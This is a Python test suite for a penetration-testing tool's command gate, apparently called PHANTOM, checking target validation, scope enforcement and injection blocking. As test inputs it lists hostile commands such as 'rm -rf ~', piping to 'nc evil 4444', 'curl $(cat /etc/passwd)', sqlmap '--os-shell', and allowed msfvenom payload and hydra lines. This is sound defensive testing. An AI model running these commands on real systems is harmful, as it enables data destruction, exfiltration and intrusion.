#!/usr/bin/env python3
"""
Security tests for the PHANTOM command gate: input validation, engagement
scope enforcement, and command-injection blocking.

Run:  python3 -m pytest tests/test_security.py   (or: python3 tests/test_security.py)
"""

import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from phantom_validators import classify_target, is_valid_target, looks_like_file
from phantom_scope import ScopeManager, authorize_command


class TestValidators(unittest.TestCase):
    def test_valid_targets(self):
        self.assertEqual(classify_target("example.com"), "domain")
        self.assertEqual(classify_target("sub.example.co.uk"), "domain")
        self.assertEqual(classify_target("192.168.1.10"), "ipv4")
        self.assertEqual(classify_target("10.0.0.0/24"), "cidr")
        self.assertEqual(classify_target("10.0.0.1-10.0.0.50"), "range")
        self.assertEqual(classify_target("10.0.0.1-50"), "range")
        self.assertEqual(classify_target("2001:db8::1"), "ipv6")
        self.assertEqual(classify_target("https://app.example.com/login"), "url")

    def test_injection_payloads_are_invalid(self):
        for bad in [
            "example.com; rm -rf ~",
            "example.com;rm",
            "$(curl evil.sh)",
            "`id`",
            "a.com|nc",
            "a.com && wget x",
            "a.com>/etc/passwd",
            "'; DROP TABLE",
        ]:
            self.assertFalse(is_valid_target(bad), f"should reject: {bad!r}")

    def test_file_detection(self):
        self.assertTrue(looks_like_file("rockyou.txt"))
        self.assertTrue(looks_like_file("/tmp/payload.rc"))
        self.assertFalse(looks_like_file("example.com"))


class TestScopeManager(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".json", delete=False)
        self.tmp.close()
        self.scope = ScopeManager(path=self.tmp.name)

    def tearDown(self):
        os.unlink(self.tmp.name)

    def test_add_valid_and_invalid(self):
        ok, _ = self.scope.add("example.com")
        self.assertTrue(ok)
        ok, _ = self.scope.add("bad;target")
        self.assertFalse(ok)

    def test_subdomain_and_cidr_matching(self):
        self.scope.add("example.com")
        self.scope.add("192.168.1.0/24")
        self.assertTrue(self.scope.is_in_scope("example.com"))
        self.assertTrue(self.scope.is_in_scope("api.example.com"))
        self.assertTrue(self.scope.is_in_scope("https://example.com/x"))
        self.assertTrue(self.scope.is_in_scope("192.168.1.55"))
        self.assertFalse(self.scope.is_in_scope("evil.com"))
        self.assertFalse(self.scope.is_in_scope("10.0.0.1"))

    def test_persistence(self):
        self.scope.add("example.com")
        reloaded = ScopeManager(path=self.tmp.name)
        self.assertIn("example.com", reloaded.list())


class TestAuthorizeCommand(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".json", delete=False)
        self.tmp.close()
        self.scope = ScopeManager(path=self.tmp.name)
        self.scope.add("example.com")
        self.scope.add("192.168.1.0/24")

    def tearDown(self):
        os.unlink(self.tmp.name)

    def allow(self, cmd, name):
        ok, reason = authorize_command(cmd, name, self.scope)
        self.assertTrue(ok, f"expected ALLOW for {cmd!r} ({name}): {reason}")

    def block(self, cmd, name):
        ok, reason = authorize_command(cmd, name, self.scope)
        self.assertFalse(ok, f"expected BLOCK for {cmd!r} ({name})")

    def test_in_scope_allowed(self):
        self.allow("nmap -sV example.com", "nmap")
        self.allow("nikto -h https://example.com", "nikto")
        self.allow("nmap -sV 192.168.1.10", "nmap")

    def test_out_of_scope_blocked(self):
        self.block("nmap -sV evil.com", "nmap")
        self.block("nikto -h http://10.9.9.9", "nikto")

    def test_injection_blocked(self):
        self.block("nmap -sV example.com; rm -rf ~", "nmap")
        self.block("whois example.com | nc evil 4444", "whois")
        self.block("curl $(cat /etc/passwd) example.com", "curl")
        self.block("nmap -sV evil.com && nikto -h example.com", "nmap")

    def test_multiscan_chain_allowed_when_in_scope(self):
        self.allow("nmap -sV example.com && nikto -h example.com", "multi_scan")

    def test_multiscan_chain_blocked_when_out_of_scope(self):
        self.block("nmap -sV evil.com && nikto -h evil.com", "multi_scan")

    def test_local_tools_not_scope_blocked(self):
        self.allow("john --format=raw-md5 hashes.txt", "john")
        self.allow("nc -lvnp 4444", "netcat")
        self.allow("msfvenom -p linux/x64/shell LHOST=192.168.1.5 LPORT=4444 -f elf", "msfvenom")

    def test_installs_allowed(self):
        self.allow("sudo apt update && sudo apt install -y nmap", "install:nmap")

    def test_enforcement_toggle(self):
        self.scope.set_enforced(False)
        self.allow("nmap -sV evil.com", "nmap")   # scope off → allowed
        # ...but injection is still blocked regardless of scope setting
        self.block("nmap -sV evil.com; rm -rf ~", "nmap")

    # ── argument injection ────────────────────────
    def test_argument_injection_blocked(self):
        self.block("nmap -sV example.com -oN /tmp/out", "nmap")
        self.block("nmap -sV example.com -iL /etc/passwd", "nmap")
        self.block("sqlmap -u https://example.com --os-shell", "sqlmap")
        self.block("sqlmap -u https://example.com --file-read=/etc/passwd", "sqlmap")
        self.block("curl -I -L https://example.com -o /etc/cron.d/x", "curl")
        self.block("gobuster dir -u https://example.com -o /tmp/x", "gobuster")

    def test_argument_injection_blocked_even_with_scope_off(self):
        self.scope.set_enforced(False)
        self.block("nmap -sV evil.com -oN /tmp/out", "nmap")

    def test_legitimate_gui_commands_still_allowed(self):
        # These are exactly what the GUI builds — must NOT be blocked.
        self.allow("nmap -sS -T4 -p 80,443 -v -O --script=default example.com", "nmap")
        self.allow("sqlmap -u https://example.com --crawl=2 --dbs --tables --dump --risk=3 --batch", "sqlmap")
        self.allow("gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt", "gobuster")
        self.allow("wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt https://example.com/FUZZ", "wfuzz")
        self.allow("hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -V example.com ssh", "hydra")
        self.allow("nikto -h https://example.com", "nikto")

    def test_local_tools_may_use_file_flags(self):
        # msfvenom legitimately writes output with -o; not a scan tool.
        self.allow("msfvenom -p linux/x64/shell LHOST=192.168.1.5 LPORT=4444 -f elf -o /tmp/payload.elf", "msfvenom")

    # ── style-guide tools (phantom style.docx) ────────────────
    def test_style_guide_scan_tools_in_scope(self):
        self.allow("dnsenum example.com", "dnsenum")
        self.allow("dnsrecon -d example.com", "dnsrecon")
        self.allow("sublist3r -d example.com", "sublist3r")
        self.allow("wpscan --url https://example.com", "wpscan")
        self.allow("snmp-check 192.168.1.10", "snmp-check")
        self.allow("onesixtyone 192.168.1.10", "onesixtyone")
        self.allow("enum4linux 192.168.1.10", "enum4linux")
        self.allow("arp-scan 192.168.1.0/24", "arp-scan")

    def test_style_guide_scan_tools_out_of_scope(self):
        self.block("dnsenum evil.com", "dnsenum")
        self.block("wpscan --url https://evil.com", "wpscan")
        self.block("enum4linux 10.9.9.9", "enum4linux")

    def test_style_guide_scan_tools_argument_injection(self):
        self.block("dnsenum example.com -o /tmp/out", "dnsenum")
        self.block("dnsrecon -d example.com -j /tmp/out.json", "dnsrecon")
        self.block("sublist3r -d example.com -o /tmp/out", "sublist3r")
        self.block("wpscan --url https://example.com -o /tmp/out", "wpscan")
        self.block("onesixtyone 192.168.1.10 -o /tmp/out", "onesixtyone")

    def test_style_guide_local_tools_not_scope_blocked(self):
        # Local / post-exploitation tools run on the operator box or a
        # compromised host — exempt from scope, still injection-checked.
        self.allow("mimikatz", "mimikatz")
        self.allow("bloodhound", "bloodhound")
        self.allow("linpeas", "linpeas")
        self.allow("winpeas", "winpeas")
        self.allow("responder -I eth0", "responder")
        self.allow("recon-ng", "recon-ng")
        self.allow("sherlock username", "sherlock")
        self.allow("cherrytree", "cherrytree")
        self.allow("dradis", "dradis")
        # ...but injection is still blocked for them
        self.block("responder -I eth0; rm -rf ~", "responder")

if __name__ == "__main__":
    unittest.main(verbosity=2)
